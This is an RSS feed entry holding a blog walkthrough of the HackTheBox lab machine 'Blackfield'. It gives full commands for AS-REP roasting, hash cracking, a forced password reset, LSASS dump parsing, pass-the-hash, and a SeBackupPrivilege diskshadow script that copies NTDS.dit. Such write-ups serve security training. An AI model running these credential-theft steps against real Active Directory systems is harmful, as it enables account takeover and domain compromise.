@@ -1,0 +1,1424 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>SMB on Ef&#39;s log</title>
+    <link>https://fahmifj.github.io/tags/smb/</link>
+    <description>Recent content in SMB on Ef&#39;s log</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <lastBuildDate>Tue, 04 May 2021 14:28:21 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/smb/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>HackTheBox - Blackfield</title>
+      <link>https://fahmifj.github.io/writeups/hackthebox/htb-blackfield/</link>
+      <pubDate>Tue, 04 May 2021 14:28:21 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-blackfield/</guid>
+      <description>Blackfield is a hard difficulty Windows machine from HackTheBox that features Active Directory environment. It begins with collecting a list of usernames from an SMB share. With these usernames, I&amp;rsquo;m able to perform AS-REP roasting attack and obtain a TGT from a helpdesk account. The helpdesk account can be used to reset the password of an audit account. Re-enumerating SMB shares using the audit account finds an LSASS memory dump file.</description>
+      <content:encoded><![CDATA[<p>Blackfield is a hard difficulty Windows machine  from HackTheBox that features Active Directory environment. It begins with collecting a list of usernames from an SMB share. With these usernames, I&rsquo;m able to perform AS-REP roasting attack and obtain a TGT from a helpdesk account. The helpdesk account can be used to reset the password of an audit account. Re-enumerating SMB shares using the audit account finds an LSASS memory dump file. The dump file contains an NT hash of a service account that is a member of Backup Operators. The privileges of the Backup Operators group can be abused to create a volume shadow copy and pull the <code>NTDS.dit</code> file from there. With the <code>NTDS.dit</code> file, I&rsquo;m able to retrieves the NT hash of the administrator account, and then perform pass-the-hash attack to gain administrator access.</p>
+<h3 id="skills-learned">Skills Learned</h3>
+<ul>
+<li>AS-REP roasting</li>
+<li>LDAP enumeration</li>
+<li>BloodHound</li>
+<li>Abusing Windows Access Tokens - SeBackupPrivilege</li>
+</ul>
+<h3 id="tools">Tools</h3>
+<ul>
+<li>Kali Linux 2019.4 (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
+<li>Nmap - Preinstalled in Kali Linux</li>
+<li>smbclient - Preinstalled in Kali Linux</li>
+<li>SMBMap - Preinstalled in Kali Linux</li>
+<li>ldapdomaindump - <a href="https://github.com/dirkjanm/ldapdomaindump">https://github.com/dirkjanm/ldapdomaindump</a></li>
+<li>CrackMapExec - <a href="https://github.com/byt3bl33d3r/CrackMapExec">https://github.com/byt3bl33d3r/CrackMapExec</a></li>
+<li>BloodHound - <a href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a></li>
+<li>BloodHound.py - <a href="https://github.com/fox-it/BloodHound.py">https://github.com/fox-it/BloodHound.py</a></li>
+<li>SeBackupPrivilege CmdLets - <a href="https://github.com/giuliano108/SeBackupPrivilege">https://github.com/giuliano108/SeBackupPrivilege</a></li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «blackfield» «10.10.14.169»
+$ nmap -sC -sV -oN initial-blackfield 10.10.10.192
+Nmap scan report <span style="color:#66d9ef">for</span> blackfield.htb <span style="color:#f92672">(</span>10.10.10.192<span style="color:#f92672">)</span>
+Host is up <span style="color:#f92672">(</span>0.054s latency<span style="color:#f92672">)</span>.
+
+PORT STATE SERVICE VERSION
+53/tcp open domain?
+| fingerprint-strings: 
+| DNSVersionBindReqTCP: 
+| version
+|_ bind
+88/tcp open kerberos-sec Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2020–10–04 10:53:38Z<span style="color:#f92672">)</span>
+135/tcp open msrpc Microsoft Windows RPC
+389/tcp open ldap Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: BLACKFIELD.local0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+445/tcp open microsoft-ds?
+593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
+3268/tcp open ldap Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: BLACKFIELD.local0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+<span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V<span style="color:#f92672">=</span>7.80%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>10/3%Time<span style="color:#f92672">=</span>5F794746%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>DNSV
+SF:ersionBindReqTCP,20,<span style="color:#e6db74">&#34;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
+</span><span style="color:#e6db74">SF:x04bind\0\0\x10\0\x03&#34;</span><span style="color:#f92672">)</span>;
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+Host script results:
+|_clock-skew: 6h59m59s
+| smb2-security-mode: 
+| 2.02: 
+|_ Message signing enabled and required
+| smb2-time: 
+| date: 2020–10–04T10:55:58
+|_ start_date: N/A
+</code></pre></div><p>An initial TCP scan with <code>nmap</code> discovered at least seven open ports. These ports are the typical port used by Active Directory Domain Controller (AD DC).</p>
+<p>I&rsquo;ll summarize the result:</p>
+<ul>
+<li>There is a DNS service on port 53, but HTB box is a single machine, so enumerating this service is not priority.</li>
+<li>There is a Kerberos service on port 88 is running Kerberos. I can try AS-REP roasting here.</li>
+<li>There is MS-RPC service on port 135, which I don&rsquo;t touch it really often, so I&rsquo;ll lower the priority.</li>
+<li>There is an LDAP service on port 389, LDAP is the standard protocol for directory services. Active Directory is Microsoft&rsquo;s implementation of directory services and it supports LDAP query.</li>
+<li>There is an SMB service on port 445. I can try anonymous login here.</li>
+<li>Port 3268 is running LDAP as well, but it&rsquo;s used as <a href="https://social.technet.microsoft.com/Forums/Lync/en-US/e52b9154-b93a-4a3b-b6f2-0285f932da14/389-and-3268-port-difference?forum=winserverDS">global catalog</a> (read more: <a href="https://www.techopedia.com/definition/25429/global-catalog-gc">here</a>).</li>
+</ul>
+<p><code>nmap</code> also identified the AD domain name is <code>blackfield.local</code>.</p>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-389---ldap">TCP 389 - LDAP</h3>
+<p>On LDAP, I can send a query to obtain the domain metadata, but first I&rsquo;ll look into the rootDSE<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup> to retrieve a list of the domain naming context.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «blackfield» «10.10.14.169»
+$ ldapsearch -LLL -x -h 10.10.10.192 -s base namingContexts
+dn:
+namingcontexts: DC<span style="color:#f92672">=</span>BLACKFIELD,DC<span style="color:#f92672">=</span>local
+namingcontexts: CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>BLACKFIELD,DC<span style="color:#f92672">=</span>local
+namingcontexts: CN<span style="color:#f92672">=</span>Schema,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>BLACKFIELD,DC<span style="color:#f92672">=</span>local
+namingcontexts: DC<span style="color:#f92672">=</span>DomainDnsZones,DC<span style="color:#f92672">=</span>BLACKFIELD,DC<span style="color:#f92672">=</span>local
+namingcontexts: DC<span style="color:#f92672">=</span>ForestDnsZones,DC<span style="color:#f92672">=</span>BLACKFIELD,DC<span style="color:#f92672">=</span>local
+</code></pre></div><ul>
+<li>
+<p><code>-LLL</code>: removes every comments in the output</p>
+</li>
+<li>
+<p><code>-x</code>: to perform simple authentication</p>
+</li>
+<li>
+<p><code>-h</code>: hostname or IP</p>
+</li>
+<li>
+<p><code>-s</code>: search scope, base will returns the contents of the root DSE</p>
+</li>
+</ul>
+<p>I can use <code>DC=BLACKFIELD,DC=local</code> (this is called as <em>distinguished name</em>), but unfortunately the anonymous bind is not allowed.</p>
+<h3 id="tcp-445---smb">TCP 445 - SMB</h3>
+<p>Trying anonymous login with <code>crackmapexec</code> returns a status access denied.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «blackfield» «10.10.14.169»
+$ crackmapexec smb 10.10.10.192 -u <span style="color:#e6db74">&#39;&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> --shares
+SMB         10.10.10.192    <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows 10.0 Build <span style="color:#ae81ff">17763</span> <span style="color:#f92672">(</span>name:DC01<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:BLACKFIELD.local<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
+SMB         10.10.10.192    <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> BLACKFIELD.local<span style="color:#ae81ff">\:</span> STATUS_ACCESS_DENIED
+SMB         10.10.10.192    <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Error enumerating shares: STATUS_ACCESS_DENIED
+</code></pre></div><p>But on using <code>smbclient</code>, it return the shares list.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «blackfield» «10.10.14.169»
+$ smbclient -N -L //10.10.10.192/
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        forensic        Disk      Forensic / Audit share.
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share
+        profiles$       Disk
+        SYSVOL          Disk      Logon server share
+Reconnecting with SMB1 <span style="color:#66d9ef">for</span> workgroup listing.
+do_connect: Connection <span style="color:#66d9ef">for</span> 10.10.10.192 failed <span style="color:#f92672">(</span>Error NT_STATUS_IO_TIMEOUT<span style="color:#f92672">)</span>
+Unable to connect with SMB1 -- no workgroup available
+</code></pre></div><p>Later, I came to know that ‘anonymous’ must be specified in <code>crackmapexec</code>.</p>
+<p><div class="img-container"><img src="imgs/image-20210504155151284.png" alt="image-20210504155151284"  /></div>
+</p>
+<h4 id="profiles-share">profiles$ share</h4>
+<p>I have read permission on the <code>profile$</code> share. The share contains a bunch of empty users folder.</p>
+<p><div class="img-container"><img src="imgs/image-20210504155638689.png" alt="image-20210504155638689"  /></div>
+</p>
+<p>I can convert these folders name to list of username using <code>awk '{print $1}'</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «blackfield» «10.10.14.169»
+$ cat folder.list | awk <span style="color:#e6db74">&#39;{print $1}&#39;</span> | tee users.list
+AAlleni
+ABarteski
+ABekesz
+ABenzies
+ABiemiller
+AChampken
+...&lt;SNIP&gt;...
+</code></pre></div><p>Now that I have a list of usernames, I can try AS-REP roast attack.</p>
+<h3 id="tcp-88---kerberos">TCP 88 - Kerberos</h3>
+<h4 id="as-rep-roasting">AS-REP roasting</h4>
+<p>I&rsquo;ll use <code>GetNPUsers.py</code> to perform AS-REP roasting on Kerberos.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «blackfield» «10.10.14.169»
+$ GetNPUsers.py BLACKFIELD.LOCAL/ -no-pass -usersfile users.list -dc-ip 10.10.10.192 -outputfile TGT_AS-REP
+</code></pre></div><p>And watching the output file using watch command</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «blackfield» «10.10.14.169»
+$ watch -n <span style="color:#ae81ff">1</span> cat TGT_AS-REP
+</code></pre></div><p>After a few minutes, it shows the hash for user <code>support</code>.</p>
+<p><div class="img-container"><img src="imgs/image-20210504160338371.png" alt="image-20210504160338371"  /></div>
+</p>
+<p>I&rsquo;ll send the hash to my Windows for cracking.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «blackfield» «10.10.14.169»
+$ cat TGT_AS-REP
+$krb5asrep$23$support@BLACKFIELD.LOCAL:55211d2eb15e1539552de705eb8605c4$821c479c296fc01c7db5c01f75c08cedd607897692d622f1de2972d6601ebd880b3cb32e663e8c1a2cac5f2531aa1f1cb1323bc6b2a1816d212f179031952b9c1c1290cf11066339706d5cc592ab1e4e9de40e4db0986647c550860b2677671ce6b4b73761e119f56d9651b277a1297a87fa160e22eed4ecee7cb522c03d142cac647a467dfc48f69afb17fef110337134cfef9070f0b1f34d073772409dc31c6c0d0edea5562a9a37387ea44a48fb4947277e84300db0bf7da4ec5a9b3be94a7a1d4c910b1dd39f17ace62366f8e111dca756e13359750171464cd23b23e7b33d427a42978b489dc0a58bc9e586ff02ff3ab805
+</code></pre></div><h3 id="cracking-the-hash">Cracking the Hash</h3>
+<p>I&rsquo;ll use dictionary attack to recover the user password using <code>hashcat</code>, and it cracks within a few seconds.</p>
+<pre><code>C:\tools\hashcat6&gt; hashcat -m 18200 hashes/blackfield.hash rockyou.txt -O
+hashcat (v6.1.1) starting...
+
+...&lt;SNIP&gt;...
+$krb5asrep$23$support@BLACKFIELD.LOCAL:55211d2eb15e1539552de705eb8605c4$821c479c296fc01c7db5c01f75c08cedd607897692d622f1de2972d6601ebd880b3cb32e663e8c1a2cac5f2531aa1f1cb1323bc6b2a1816d212f179031952b9c1c1290cf11066339706d5cc592ab1e4e9de40e4db0986647c550860b2677671ce6b4b73761e119f56d9651b277a1297a87fa160e22eed4ecee7cb522c03d142cac647a467dfc48f69afb17fef110337134cfef9070f0b1f34d073772409dc31c6c0d0edea5562a9a37387ea44a48fb4947277e84300db0bf7da4ec5a9b3be94a7a1d4c910b1dd39f17ace62366f8e111dca756e13359750171464cd23b23e7b33d427a42978b489dc0a58bc9e586ff02ff3ab805:#00^BlackKnight
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: Kerberos 5, etype 23, AS-REP
+Hash.Target......: $krb5asrep$23$support@BLACKFIELD.LOCAL:55211d2eb15e...3ab805
+...&lt;SNIP&gt;...
+</code></pre><p>The password for user <code>support</code> is <code>#00^BlackKnight</code>.</p>
+<h3 id="access-as-support">Access as support</h3>
+<p>Now that I obtained a set of credentials, I can re-enumerate the available services.</p>
+<h4 id="ldap-domain-dump">LDAP Domain Dump</h4>
+<p>The credentials works on LDAP, I can use it to obtain the domain info using <a href="https://github.com/dirkjanm/ldapdomaindump">ldapdomaindump</a>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «loot» «10.10.14.169»
+$ ldapdomaindump -u <span style="color:#e6db74">&#39;BLACKFIELD.LOCAL\support&#39;</span> -p <span style="color:#e6db74">&#39;#00^BlackKnight&#39;</span> -no-json -no-grep 10.10.10.192
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Connecting to host...
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Binding to host
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Bind OK
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting domain dump
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Domain dump finished
+</code></pre></div><p>The output from the tool are formatted in HTML document, and I get the following information:</p>
+<p>The OS information and the computer FQDN.</p>
+<p><div class="img-container"><img src="imgs/image-20210504162822528.png" alt="image-20210504162822528"  /></div>
+</p>
+<p>The domain policy.</p>
+<p><div class="img-container"><img src="imgs/image-20210504162931229.png" alt="image-20210504162931229"  /></div>
+</p>
+<p>The interesting domain users.</p>
+<p><div class="img-container"><img src="imgs/image-20210504163338913.png" alt="image-20210504163338913"  /></div>
+</p>
+<p><div class="img-container"><img src="imgs/image-20210504163255290.png" alt="image-20210504163255290"  /></div>
+</p>
+<p>Interesting groups</p>
+<p><div class="img-container"><img src="imgs/image-20210504163741235.png" alt="image-20210504163741235"  /></div>
+</p>
+<p><div class="img-container"><img src="imgs/image-20210504163658173.png" alt="image-20210504163658173"  /></div>
+</p>
+<p><div class="img-container"><img src="imgs/image-20210504163716719.png" alt="image-20210504163716719"  /></div>
+</p>
+<p>From here, I know that user <code>support</code> does not have remote shell access like WinRM.</p>
+<h4 id="bloodhound">BloodHound</h4>
+<p>There is a python-based ingestor for <code>BloodHound</code> besides <code>SharpHound</code>. It can be used remotely from Linux.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «loot» «10.10.14.169»
+$ python bloodhound.py -c All -u <span style="color:#e6db74">&#39;support@blackfield.local&#39;</span> -p <span style="color:#e6db74">&#39;#00^BlackKnight&#39;</span> -d blackfield.local -dc DC01.BLACKFIELD.local -ns 10.10.10.192
+</code></pre></div><ul>
+<li><code>-c</code>: collect method : all</li>
+<li><code>-u</code>,<code>-p</code>: credentials set</li>
+<li><code>-d</code>: domain name</li>
+<li><code>-dc</code>: FQDN of domain controller (it’s on ldap domain dump section → <strong>domain_computers.html</strong>)</li>
+<li><code>-ns</code>: name server / DNS</li>
+</ul>
+<p>It returns the following output:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">INFO: Found AD domain: blackfield.local
+INFO: Connecting to LDAP server: DC01.BLACKFIELD.local
+INFO: Found <span style="color:#ae81ff">1</span> domains
+INFO: Found <span style="color:#ae81ff">1</span> domains in the forest
+INFO: Found <span style="color:#ae81ff">18</span> computers
+INFO: Connecting to LDAP server: dc01.blackfield.local
+INFO: Found <span style="color:#ae81ff">316</span> users
+INFO: Connecting to GC LDAP server: dc01.blackfield.local
+INFO: Found <span style="color:#ae81ff">51</span> groups
+INFO: Found <span style="color:#ae81ff">0</span> trusts
+INFO: Starting computer enumeration with <span style="color:#ae81ff">10</span> workers
+INFO: Querying computer: DC01.BLACKFIELD.local
+INFO: Done in 00M 18S
+</code></pre></div><p>The output files from the tool are in json format. They are: <code>computers.json</code>, <code>domains.json</code>, <code>groups.json</code> and <code>users.json</code>.</p>
+<p>I can upload these files to <code>BloodHound</code> GUI by drag and drop.</p>
+<p><div class="img-container"><img src="imgs/image-20210504165340110.png" alt="image-20210504165340110"  /></div>
+</p>
+<p>Enumerating the user <code>support</code> permissions discovers it has <code>ForceChangePassword</code> permission on Audit2020. That means user <code>support</code> is able to change the user <code>audit2020</code> password.</p>
+<p><div class="img-container"><img src="imgs/image-20210504165510700.png" alt="image-20210504165510700"  /></div>
+</p>
+<h4 id="reset-audit2020-password">Reset Audit2020 Password</h4>
+<p>I can change the user <code>audit2020</code> password using <code>net rpc</code><sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup>. I&rsquo;ll set <code>P@$$w0rd!</code> as the new password for user <code>audit2020</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «blackfield» «10.10.14.169»
+$ net rpc password audit2020 -U <span style="color:#e6db74">&#39;support%#00^BlackKnight&#39;</span> -S 10.10.10.192
+Enter new password <span style="color:#66d9ef">for</span> audit2020: 
+</code></pre></div><h3 id="access-as-audit2020">Access as Audit2020</h3>
+<h4 id="forensic-share">forensic share</h4>
+<p>With <code>audit2020</code>, I can access the forensic share.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «blackfield» «10.10.14.169»
+$ smbmap -H 10.10.10.192 -u audit2020 -p <span style="color:#e6db74">&#39;P@$$w0rd!&#39;</span> 
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> IP: 10.10.10.192:445        Name: BLACKFIELD.local
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        forensic                                                READ ONLY       Forensic / Audit share.
+        IPC$                                                    READ ONLY       Remote IPC
+        NETLOGON                                                READ ONLY       Logon server share
+        profiles$                                               READ ONLY
+        SYSVOL                                                  READ ONLY       Logon server share
+</code></pre></div><p>Inside the share, there is three folders, and I&rsquo;ll download all of them to my Kali.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «blackfield» «10.10.14.169»
+$ smbclient -U <span style="color:#e6db74">&#39;audit2020%P@$$w0rd!&#39;</span>//10.10.10.192/forensic 
+Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+smb: <span style="color:#ae81ff">\&gt;</span> ls
+  .                                   D        <span style="color:#ae81ff">0</span>  Sun Feb <span style="color:#ae81ff">23</span> 20:03:16 <span style="color:#ae81ff">2020</span>
+  ..                                  D        <span style="color:#ae81ff">0</span>  Sun Feb <span style="color:#ae81ff">23</span> 20:03:16 <span style="color:#ae81ff">2020</span>
+  commands_output                     D        <span style="color:#ae81ff">0</span>  Mon Feb <span style="color:#ae81ff">24</span> 01:14:37 <span style="color:#ae81ff">2020</span>
+  memory_analysis                     D        <span style="color:#ae81ff">0</span>  Fri May <span style="color:#ae81ff">29</span> 03:28:33 <span style="color:#ae81ff">2020</span>
+  tools                               D        <span style="color:#ae81ff">0</span>  Sun Feb <span style="color:#ae81ff">23</span> 20:39:08 <span style="color:#ae81ff">2020</span>
+smb: <span style="color:#ae81ff">\&gt;</span> recurse on
+smb: <span style="color:#ae81ff">\&gt;</span> mget *
+</code></pre></div><p>Enumerating on the memory_analysis folder, there is a file called <code>lsass.zip</code> that contains <code>lsass.DMP</code> which is interesting to me.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «blackfield» «10.10.14.169»
+$ file lsass.DMP
+lsass.DMP: Mini DuMP crash report, <span style="color:#ae81ff">16</span> streams, Sun Feb <span style="color:#ae81ff">23</span> 18:02:01 2020, 0x421826 type
+</code></pre></div><blockquote>
+<p>LSASS (Local Security Authentication Subsystem Service) is a service/process that used to verify and authenticate users on login to a Windows computer. In other words, it holds the Windows credentials.</p>
+</blockquote>
+<p>I can use a tool called <code>pypykatz</code> to dump the contents of <code>lsass.DMP</code>. The NT hash of <code>svc-backup</code> immediately shows up on the top.</p>
+<p><div class="img-container"><img src="imgs/image-20210504173356195.png" alt="image-20210504173356195"  /></div>
+</p>
+<p><code>svc_backup:9658d1d1dcd9250115e2205d9f48400d</code>.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-svc_backup">Shell as svc_backup</h3>
+<h4 id="remote-access">Remote Access</h4>
+<p>I already know that this user can login remotely (from <a href="#ldap-domain-dump">LDAP</a>), so I can try it with <code>evil-winrm</code>, and it works.</p>
+<pre><code>→ root@iamf «blackfield» «10.10.14.169»
+$ evil-winrm -i 10.10.10.192 -u svc_backup -H '9658d1d1dcd9250115e2205d9f48400d'
+</code></pre><p><div class="img-container"><img src="imgs/image-20210504173749952.png" alt="image-20210504173749952"  /></div>
+</p>
+<p>User flag is done here.</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-administrator">Shell as Administrator</h3>
+<h4 id="internal-enumeration">Internal Enumeration</h4>
+<p>Also from <a href="#ldap-domain-dump">LDAP</a>, <code>svc-backup</code> is a member of the Backup Operators group. Each member of the Backup Operators group can perform backup and restore operations. The privilege name to perform those two operations are called <code>SeBackupPrivilege</code> and <code>SeRestorePrivilege</code>.</p>
+<p><div class="img-container"><img src="imgs/image-20210504174334134.png" alt="image-20210504174334134"  /></div>
+</p>
+<p>Those two privileges can be abused<sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup> using <code>diskshadow</code><sup id="fnref:4"><a href="#fn:4" class="footnote-ref" role="doc-noteref">4</a></sup>.</p>
+<p>I can&rsquo;t just perform the backup and restore if the system is currently in use. But, there is a technology from Microsoft called &ldquo;Shadow Copy&rdquo; that makes this possible, and that&rsquo;s where <code>diskshadow</code> will be used.</p>
+<p>So the idea is that I can create a volume shadow of <code>C:\</code> drive and backup the <code>NTDS.dit</code> file (AD database) from the volume shadow back to <code>C:\</code> drive. After that I can grab the <code>ntds.dit</code> and dump the NT hashes from <code>NTDS.dit</code> locally using <code>secretsdump.py</code>.</p>
+<h4 id="abusing-sebackupprivilege">Abusing SeBackupPrivilege</h4>
+<p>To abuse this privilege, I&rsquo;ll use <a href="https://gist.githubusercontent.com/bohops/d34d9cf7793ba5f98009bc4ab2acd8f9/raw/38706044fb62790db16b0af21b7028a59591c05f/diskshadow.txt">this gist</a> as reference, and I&rsquo;ll need <a href="https://github.com/giuliano108/SeBackupPrivilege">this module</a>.</p>
+<p>Then, I&rsquo;ll create a few scripts to perform all the needed actions (create a volume, grab <code>ntds.dit</code>, and cleanup the volume shadow) in one shot.</p>
+<p>First, the script for grabbing <code>ntds.dit</code>, I&rsquo;ll save it as <code>copy.cmd</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">cmd.exe /c &#34;powershell.exe -c Import-Module(Resolve-Path(&#39;SeBackupPrivilegeCmdLets.dll&#39;)); Import-Module(Resolve-Path(&#39;SeBackupPrivilegeCmdLets.dll&#39;)); Copy-FileSeBackupPrivilege f:\windows\ntds\ntds.dit C:\temp\ntds.dit&#34;
+</code></pre></div><p>Second, the script for creating and deleting the volume shadow, I&rsquo;ll save it as <code>script.txt</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">set context persistent nowriters 
+add volume c: alias iamf 
+create 
+expose %iamf% f: 
+exec &#34;copy.cmd&#34; 
+delete shadows volume %iamf% 
+reset
+</code></pre></div><p>I&rsquo;ll move the modules and the scripts to a folder called <code>exploits</code>.</p>
+<pre><code>→ root@iamf «exploits» «10.10.14.169»
+$ tree
+.
+├── SeBackupPrivilegeCmdLets.dll
+├── SeBackupPrivilegeUtils.dll
+├── copy.cmd
+└── script.txt
+
+0 directories, 4 files
+</code></pre><p>Now, I’ll copy these <code>.dll</code> modules, <code>copy.cmd</code>, and <code>script.txt</code> to Blackfield using upload feature from <code>evil-winrm</code> at <code>C:\temp\</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «exploits» «10.10.14.169»
+$ evil-winrm -i 10.10.10.192 -u svc_backup -H <span style="color:#e6db74">&#39;9658d1d1dcd9250115e2205d9f48400d&#39;</span>
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>vc_backup<span style="color:#ae81ff">\D</span>ocuments&gt;mkdir C:<span style="color:#ae81ff">\t</span>emp; cd C:<span style="color:#ae81ff">\t</span>emp
+...&lt;SNIP&gt;...
+*Evil-WinRM* PS C:<span style="color:#ae81ff">\t</span>emp&gt; upload SeBackupPrivilegeCmdLets.dll
+...&lt;SNIP&gt;...
+*Evil-WinRM* PS C:<span style="color:#ae81ff">\t</span>emp&gt; upload SeBackupPrivilegeUtils.dll
+...&lt;SNIP&gt;...
+*Evil-WinRM* PS C:<span style="color:#ae81ff">\t</span>emp&gt; upload copy.cmd
+...&lt;SNIP&gt;...
+*Evil-WinRM* PS C:<span style="color:#ae81ff">\t</span>emp&gt; upload script.txt
+...&lt;SNIP&gt;...
+</code></pre></div><p>After that, I can run <code>diskshadow</code> with the <code>/s</code> option and specify <code>script.txt</code> as the command sequence.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Evil-WinRM* PS C:\temp&gt; diskshadow /s script.txt
+Microsoft DiskShadow version 1.0
+Copyright (C) 2013 Microsoft Corporation
+On computer:  DC01,  10/4/2020 8:15:53 AM
+
+-&gt; set context persistent nowriters
+-&gt; add volume c: alias iamf
+-&gt; create
+
+Alias iamf for shadow ID {7c53326a-2617-450c-9d2d-5c381352aa45} set as environment variable.
+Alias VSS_SHADOW_SET for shadow set ID {6142125a-a889-46a9-9d5e-87ff17b66d2c} set as environment variable.
+
+Querying all shadow copies with the shadow copy set ID {6142125a-a889-46a9-9d5e-87ff17b66d2c}
+
+        * Shadow copy ID = {7c53326a-2617-450c-9d2d-5c381352aa45}               %iamf%
